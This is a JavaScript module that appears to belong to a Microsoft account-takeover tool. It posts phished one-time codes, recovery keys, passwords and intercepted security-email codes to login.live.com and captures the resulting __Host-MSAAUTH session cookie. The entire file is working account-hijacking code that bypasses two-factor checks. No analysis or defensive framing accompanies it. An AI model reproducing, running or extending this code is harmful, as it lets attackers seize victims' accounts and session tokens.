const getLiveData = require("./getLiveData");
const axios = require("axios");
const getCredentials = require("../../../autosecure/utils/info/getCredentials");
const { getEmailDescription } = require("../utils/getEmailDescription.js");
const sendott = require('./sendott');

module.exports = async function login(obj = {}, creds) {
    /*
    Login
    - OTP
    - OTP Non Phisher (security code)
    - Non-Password OTP
    - Auth
    - Password & Secretkey
    */

    let host = null;
    let passwordhost = null;
    let mspok = null;
    let oparams = null;
    let nopassword = false;

    const data = await getLiveData();

    if (!obj?.email) {
        console.log(`Missing email, how tf?`);
        return null;
    }

    if (!creds) {
        creds = await getCredentials(obj.email);
    }

    if (creds?.Credentials?.HasPassword === 0) {
        nopassword = true;
    }
    console.log(`Nopassword: ${nopassword}`);

    const cookies = (data.cookies || "").split(";").reduce((acc, cookie) => {
        const [name, ...valueParts] = cookie.trim().split("=");
        if (!name) return acc;
        acc[name] = valueParts.join("=");
        return acc;
    }, {});

    const uaid = cookies["uaid"] || "";
    const mspRequ = cookies["MSPRequ"] || "";
    const mscc = cookies["MSCC"] || "";

    try {
        let loginData = null;

        if (obj.email && obj.id && obj.code) {
            if (nopassword) {
                console.log(`No password!`);
                loginData = await axios({
                    method: "POST",
                    url: "https://login.live.com/ppsecure/post.srf",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Cookie": data.cookies,
                    },
                    data: `SentProofIDE=${encodeURIComponent(obj.id)}&ProofType=1&npotc=${encodeURIComponent(obj.code)}&ps=3&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(data.ppft)}&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&type=24&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=`,
                });
            } else {
                loginData = await axios({
                    method: "POST",
                    url: "https://login.live.com/ppsecure/post.srf",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Cookie": data.cookies,
                    },
                    data: `login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&type=27&SentProofIDE=${encodeURIComponent(obj.id)}&otc=${encodeURIComponent(obj.code)}&PPFT=${encodeURIComponent(data.ppft)}`,
                });
            }

        } else if (obj.slk && obj.email) {
            loginData = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": data.cookies,
                },
                data: `login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&slk=${encodeURIComponent(obj.slk)}&psRNGCSLK=${encodeURIComponent(obj.slk)}&type=21&PPFT=${encodeURIComponent(data.ppft)}`,
            });

        } else if (obj.otp && obj.email && obj.pw) {
            const loginpassword = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": data.cookies,
                },
                data: `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(data.ppft)}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(obj.pw)}`,
            });

            if (loginpassword.status < 200 || loginpassword.status >= 400) {
                return null;
            }

            let id = null;
            try {
                const regex = /(?<="data":")[^"]+(?=","type":10,"display":)/;
                const match = typeof loginpassword.data === "string" ? loginpassword.data.match(regex) : null;
                if (match) {
                    id = match[0];
                } else if (loginpassword.data && loginpassword.data.arrUserProofs) {
                    const totpProof = loginpassword.data.arrUserProofs.find(proof => proof.type === 10);
                    if (totpProof) id = totpProof.data;
                }
            } catch (err) {
                console.error("Error extracting TOTP:", err);
                return null;
            }

            if (!id) {
                return "tfa";
            }

            let secondppft = null;
            try {
                if (typeof loginpassword.data === "string") {
                    const pattern = /sFT:'(.*?)'/g;
                    const tokens = [];
                    let m;
                    while ((m = pattern.exec(loginpassword.data)) !== null) {
                        tokens.push(m[1]);
                    }
                    secondppft = tokens.length > 0 ? tokens[0] : null;
                }
            } catch (err) {
                secondppft = null;
            }

            const setCookie = loginpassword.headers && (loginpassword.headers["set-cookie"] || loginpassword.headers["Set-Cookie"]);
            if (setCookie && Array.isArray(setCookie)) {
                setCookie.forEach(cookie => {
                    const [name, ...values] = cookie.split("=");
                    if (!name) return;
                    const key = name.trim();
                    const value = values.join("=").split(";").shift();
                    if (key === "__Host-MSAAUTH") passwordhost = value;
                    if (key === "MSPOK") mspok = value;
                    if (key === "OParams") oparams = value;
                });
            }

            if (!passwordhost) {
                return null;
            }

            loginData = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    // build minimal cookie header for second request
                    "Cookie": `__Host-MSAAUTH=${passwordhost}; uaid=${uaid}; MSPRequ=${mspRequ}; MSCC=${mscc}; MSPOK=${mspok || ""}; oParams=${oparams || ""}`,
                },
                data: `otc=${encodeURIComponent(obj.otp)}&AddTD=true&SentProofIDE=${encodeURIComponent(id)}&GeneralVerify=false&PPFT=${encodeURIComponent(secondppft || "")}&canary=&sacxt=1&hpgrequestid=&hideSmsInMfaProofs=false&type=19&login=${encodeURIComponent(obj.email)}`,
            });

        } else if (obj.email && obj.password && obj.secId && obj.secEmail) {
            const loginpassword = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": data.cookies,
                },
                data: `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(data.ppft)}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(obj.password)}`,
            });

            if (loginpassword.status < 200 || loginpassword.status >= 400) {
                return null;
            }

            try {
                if (typeof loginpassword.data === "string") {
                    const pattern = /sFT:'(.*?)'/g;
                    const tokens = [];
                    let m;
                    while ((m = pattern.exec(loginpassword.data)) !== null) tokens.push(m[1]);
                    var secondppft = tokens.length > 0 ? tokens[0] : null;
                }
            } catch (err) {
                secondppft = null;
            }

            const setCookie2 = loginpassword.headers && (loginpassword.headers["set-cookie"] || loginpassword.headers["Set-Cookie"]);
            if (setCookie2 && Array.isArray(setCookie2)) {
                setCookie2.forEach(cookie => {
                    const [name, ...values] = cookie.split("=");
                    if (!name) return;
                    const key = name.trim();
                    const value = values.join("=").split(";").shift();
                    if (key === "__Host-MSAAUTH") passwordhost = value;
                    if (key === "MSPOK") mspok = value;
                    if (key === "OParams") oparams = value;
                });
            }

            // If passwordhost missing, fail
            if (!passwordhost) return null;

            // send OTP to security email (your original code used sendott)
            await sendott(obj.secId);

            const time = Date.now();
            const otc = await getEmailDescription(time, obj.secEmail, true);
            if (!otc) return null;

            loginData = await axios.post(
                'https://login.live.com/ppsecure/post.srf?mkt=nl-NL&id=38936&contextid=6912F145433F46F1&opid=042E85CB81883750&bk=1751659710&uaid=bd6f79b0a2c840a98835e2e04d523524&pid=0&route=C518_BL2',
                `AddTD=true&SentProofIDE=${encodeURIComponent(obj.secId)}&GeneralVerify=false&PPFT=${encodeURIComponent(secondppft || "")}&canary=&sacxt=0&hpgrequestid=&hideSmsInMfaProofs=false&type=18&login=${encodeURIComponent(obj.email)}&ProofConfirmation=${encodeURIComponent(obj.secEmail)}&otc=${encodeURIComponent(otc)}`,
                {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://login.live.com',
                        'Cookie': `__Host-MSAAUTH=${passwordhost}; MSPOK=${mspok || ""}; OParams=${oparams || ""}`,
                    }
                }
            );
        } else {
            console.log('Invalid input for login.js');
            return null;
        }

        // parse set-cookie on the final loginData if present to extract final host cookie
        if (loginData && loginData.headers) {
            const setCookieFinal = loginData.headers["set-cookie"] || loginData.headers["Set-Cookie"];
            if (Array.isArray(setCookieFinal)) {
                setCookieFinal.forEach(cookie => {
                    const [name, ...values] = cookie.split("=");
                    if (!name) return;
                    if (name.trim() === "__Host-MSAAUTH") {
                        host = values.join("=").split(";").shift();
                        console.log(`Final host: ${host}`);
                    }
                });
            }
        }

        if (host && nopassword) {
            console.log(`Nopassword fix seemed to have worked!`);
        }

    } catch (error) {
        console.error("Error during login process:", error);
        throw error;
    }

    return host || null;
};